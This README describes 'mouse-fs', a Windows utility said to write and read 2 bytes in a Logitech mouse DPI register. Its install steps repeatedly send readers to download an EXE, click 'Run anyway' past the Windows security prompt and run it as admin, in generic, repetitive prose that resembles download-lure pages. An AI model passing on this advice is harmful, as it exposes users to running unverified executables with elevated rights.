# 🖱️ mouse-fs - Store Mouse Data with Ease

[![Download mouse-fs](https://img.shields.io/badge/Download-mouse--fs-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/xakhrdechchiyaruka-creator/mouse-fs)

## 🚀 What mouse-fs does

mouse-fs lets you store 2 bytes of data in a Logitech mouse DPI register.  
It gives you a simple way to keep a tiny piece of data on the device itself.

Use it when you want to:

- write 2 bytes to the mouse
- read those 2 bytes back later
- keep a small value tied to one Logitech mouse
- test how the DPI register reacts to custom data

This tool works best for users who want a small Windows utility with a single task.

## 💾 Download

Visit this page to download the app:

[mouse-fs on GitHub](https://github.com/xakhrdechchiyaruka-creator/mouse-fs)

Open the page, look for the latest release or app file, and download it to your PC.  
If the page gives you a ZIP file, extract it first.  
If it gives you an EXE file, you can run it after the download finishes.

## 🖥️ System requirements

Use a Windows PC with:

- Windows 10 or Windows 11
- one supported Logitech mouse
- a free USB port or a working wireless receiver
- admin rights if Windows asks for them

For best results, connect the mouse directly to the PC before you start.  
Keep the mouse awake and avoid unplugging it during a write step.

## 🛠️ How to install

If you downloaded a ZIP file:

1. Open the ZIP file
2. Extract the files to a folder you can find again
3. Open that folder
4. Find the app file or EXE
5. Double-click it to start

If Windows shows a security prompt:

1. Click More info
2. Click Run anyway if you trust the file source
3. Wait for the app to open

If you downloaded a single EXE file:

1. Save it to your Downloads folder or Desktop
2. Double-click it
3. Allow the app to open if Windows asks

## ▶️ How to use it

1. Connect your Logitech mouse
2. Start mouse-fs
3. Pick the mouse from the device list if the app shows one
4. Choose whether you want to write data or read data
5. Enter the 2-byte value you want to store
6. Click the action button to send the value
7. Read the result back to confirm it worked

A 2-byte value can hold a small number or short hex value.  
If the app asks for hex, use two bytes in the format it shows.  
If it asks for decimal, enter a number in the allowed range.

## 🔢 Example use cases

You can use mouse-fs for small tasks like these:

- store a short device ID
- save a test value for development
- check how a Logitech mouse handles custom DPI data
- move a small flag between two sessions
- write a known value and read it later to confirm access

This tool is not for large files or long notes.  
It is built for tiny data only.

## 🧭 What you should expect

When you write data, the tool sends 2 bytes to the mouse DPI register.  
When you read data, it pulls the same 2 bytes back if the mouse supports it.

The value may stay tied to the current mouse and its settings.  
If you change the mouse, reset it, or use a different model, the saved value may not carry over.

## 🔍 Basic workflow

A simple first run looks like this:

1. Plug in the mouse
2. Open the app
3. Write a small value
4. Read it back
5. Compare the result with what you sent

If the value matches, the mouse and app are working together.  
If the value does not match, check the mouse connection and try again.

## 🧩 Supported mouse use

mouse-fs is built for Logitech mice that expose a DPI register the app can reach.  
That means results can vary by model.

It works best when:

- the mouse uses Logitech software support
- the device stays connected during use
- no other app is changing DPI at the same time

If another program manages DPI settings, close it before you use mouse-fs.

## ⌨️ Data format

The app stores only 2 bytes.  
That means the value range is small.

Common ways to think about 2 bytes:

- as a small decimal number
- as a hex value
- as two raw bytes

If you are not sure which form to use, follow the format shown in the app window.  
Use the same format for both write and read checks.

## 🧼 Safe use tips

Keep these steps in mind:

- do not unplug the mouse during a write
- do not close the app while it is working
- use one mouse at a time
- close other mouse tools if they change DPI
- recheck the device if the value seems wrong

These steps help avoid bad reads or failed writes.

## ❓ Common questions

### Why does the app only store 2 bytes?

The mouse DPI register only gives a small space for data.  
mouse-fs uses that space to store a tiny value.

### Can I store a file?

No. The app stores only 2 bytes.  
That is too small for a file, image, or note.

### Will it work with every mouse?

No. It is made for Logitech mice that expose the needed register.  
Some models may work better than others.

### Do I need extra software?

Usually no.  
On Windows, you just need the app file and a supported mouse.

### What if the read value is different?

Try these steps:

- reconnect the mouse
- close other mouse tools
- write the value again
- open the app with admin rights
- use a different USB port

## 📁 Typical file layout

If you downloaded a ZIP package, you may see files like these:

- mouse-fs.exe
- readme.txt
- config file
- support files for Windows

Open the EXE to start the app.  
If the package includes a README file, you can open it for extra usage details.

## 🧪 First test

Use a simple value for your first test.

1. Open the app
2. Enter a small value such as 1 or 2 bytes in hex
3. Write the value
4. Read it back
5. Check that the same value returns

If that works, you can use any other value in the valid range.

## 🔐 Permissions

Windows may ask for permission to access the device.  
Allow it if the app needs direct access to the mouse.

If the app does not see the mouse:

- close the app
- reconnect the mouse
- start the app again
- try running it as admin

## 🧰 Troubleshooting

### The app does not open

- make sure the download finished
- check that you extracted the ZIP file
- try running the EXE again
- check Windows Defender or SmartScreen prompts

### The mouse does not appear

- unplug and reconnect the mouse
- try a different USB port
- remove other mouse tools for now
- use the mouse’s direct receiver or cable

### The value does not save

- make sure the write step completed
- keep the mouse connected
- try the operation again
- confirm the mouse model supports the register

### The read value looks wrong

- write the value one more time
- wait a moment before reading
- close other device tools
- reconnect the mouse and test again

## 📌 Use the GitHub page

Use the project page to get the latest version:

[https://github.com/xakhrdechchiyaruka-creator/mouse-fs](https://github.com/xakhrdechchiyaruka-creator/mouse-fs)

Visit this page to download the latest app file, then run it on Windows after the download finishes

## 🧾 Quick start

1. Open the GitHub page
2. Download the latest file
3. Extract it if needed
4. Connect your Logitech mouse
5. Run mouse-fs
6. Write 2 bytes of data
7. Read them back to check the result